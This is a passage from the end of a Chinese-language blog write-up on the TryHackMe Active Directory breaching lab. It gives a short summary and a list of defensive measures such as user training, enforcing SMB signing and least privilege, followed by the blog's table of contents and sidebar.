<h1 id="0x08-总结">0x08 总结</h1>
<p>可以通过大量的攻击途径来破坏 AD。我们介绍了该网络中红队演习期间常用的一些常用方法。由于攻击面的巨大，人们不断发现恢复第一组 AD 凭据的新途径。需要建立适当的枚举方法并不断更新它才能找到初始凭证对。</p>
<h2 id="防御措施">防御措施</h2>
<p>在防御措施方面，组织可以采取一些步骤：</p>
<ul>
<li>用户意识和培训 - 网络安全链中最薄弱的环节几乎总是用户。对用户进行培训，让他们意识到在泄露凭证等敏感信息时应小心谨慎，并且不要信任可疑电子邮件，从而减少这种攻击面。</li>
<li>限制在线 AD 服务和应用程序的暴露 - 并非所有应用程序都必须可通过 Internet 访问，尤其是那些支持 NTLM 和 LDAP 身份验证的应用程序。相反，这些应用程序应放置在可通过 VPN 访问的 Intranet 中。然后，VPN 可以支持多重身份验证以增强安全性。</li>
<li>实施网络访问控制 (NAC) - NAC 可以防止攻击者连接网络上的恶意设备。然而，这将需要相当多的努力，因为合法设备必须被列入白名单。</li>
<li>强制执行 SMB 签名 - 通过强制执行 SMB 签名，不可能进行 SMB 中继攻击。</li>
<li>遵循最小权限原则 - 在大多数情况下，攻击者将能够恢复一组 AD 凭据。通过遵循最小特权原则，特别是对于用于服务的凭证，可以显着降低与这些凭证被泄露相关的风险。</li>
</ul>
<p>现在我们已经突破了 AD，下一步是执行 AD 的枚举，以更好地理解域结构并识别可被利用的潜在错误配置。这将在下一个房间中介绍。记得清除DNS配置！</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/02/09/thm-ru-qin-ad/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/02/09/thm-ru-qin-ad/')">THM-入侵AD</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/02/09/thm-ru-qin-ad/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-入侵AD&amp;url=http://hybcx.xyz/2024/02/09/thm-ru-qin-ad/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/08/thm-rootme/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-RootMe</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-Linux权限提升</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#breaching-active-directory"><span class="toc-number">1.1.</span> <span class="toc-text">Breaching Active Directory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#learning-objectives"><span class="toc-number">1.2.</span> <span class="toc-text">Learning Objectives</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-osint-%E5%92%8C%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC"><span class="toc-number">2.</span> <span class="toc-text">0x02 OSINT 和网络钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#osint-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5"><span class="toc-number">2.1.</span> <span class="toc-text">OSINT 开源情报</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phishing"><span class="toc-number">2.2.</span> <span class="toc-text">Phishing</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-ntlm-%E9%AA%8C%E8%AF%81%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.</span> <span class="toc-text">0x03 NTLM 验证服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ntlm-and-netntlm"><span class="toc-number">3.1.</span> <span class="toc-text">NTLM and NetNTLM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%99%BB%E5%BD%95%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">暴力登录攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-ldap-%E7%BB%91%E5%AE%9A%E5%87%AD%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text">0x04 LDAP 绑定凭证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ldap"><span class="toc-number">4.1.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ldap-%E5%9B%9E%E4%BC%A0%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">LDAP 回传攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-ldap-%E5%9B%9E%E4%BC%A0"><span class="toc-number">4.3.</span> <span class="toc-text">执行 LDAP 回传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">4.4.</span> <span class="toc-text">托管恶意 LDAP 服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8D%95%E8%8E%B7-ldap-%E5%87%AD%E8%AF%81"><span class="toc-number">4.5.</span> <span class="toc-text">捕获 LDAP 凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%BB%A7"><span class="toc-number">5.</span> <span class="toc-text">0x05 身份验证中继</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B6%88%E6%81%AF%E5%9D%97"><span class="toc-number">5.1.</span> <span class="toc-text">服务器消息块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#llmnr-nbt-ns-and-wpad"><span class="toc-number">5.2.</span> <span class="toc-text">LLMNR, NBT-NS, and WPAD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A6%E6%88%AA-netntlm-%E6%8C%91%E6%88%98"><span class="toc-number">5.3.</span> <span class="toc-text">拦截 NetNTLM 挑战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ntlm-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84%E6%94%BB%E5%87%BB"><span class="toc-number">5.4.</span> <span class="toc-text">NTLM 密码喷射攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E9%80%92%E6%8C%91%E6%88%98"><span class="toc-number">5.5.</span> <span class="toc-text">传递挑战</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-microsoft-%E9%83%A8%E7%BD%B2%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="toc-number">6.</span> <span class="toc-text">0x06 Microsoft 部署工具包</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mdt-and-sccm"><span class="toc-number">6.1.</span> <span class="toc-text">MDT and SCCM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pxe-boot"><span class="toc-number">6.2.</span> <span class="toc-text">PXE Boot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pxe-boot-image-retrieval"><span class="toc-number">6.3.</span> <span class="toc-text">PXE Boot Image Retrieval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-pxe-%E5%90%AF%E5%8A%A8%E6%98%A0%E5%83%8F%E6%81%A2%E5%A4%8D%E5%87%AD%E8%AF%81"><span class="toc-number">6.4.</span> <span class="toc-text">从 PXE 启动映像恢复凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">7.</span> <span class="toc-text">0x07 配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%87%AD%E8%AF%81"><span class="toc-number">7.1.</span> <span class="toc-text">配置文件凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">0x08 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">8.1.</span> <span class="toc-text">防御措施</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont 